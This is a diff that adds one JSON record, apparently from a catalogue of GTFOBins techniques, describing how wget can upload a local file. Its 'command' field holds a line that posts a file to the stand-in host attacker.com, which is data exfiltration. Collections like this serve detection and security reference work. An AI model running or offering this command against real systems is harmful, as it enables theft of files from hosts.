@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-wget-upload-1",
+  "name": "GTFOBins · wget (upload) #1",
+  "command": "wget --post-file=/path/to/input-file http://attacker.com",
+  "description": "Use wget to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "wget",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/wget/#upload",
+  "upstream_id": "wget/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/wget/"
+    }
+  ]
+}
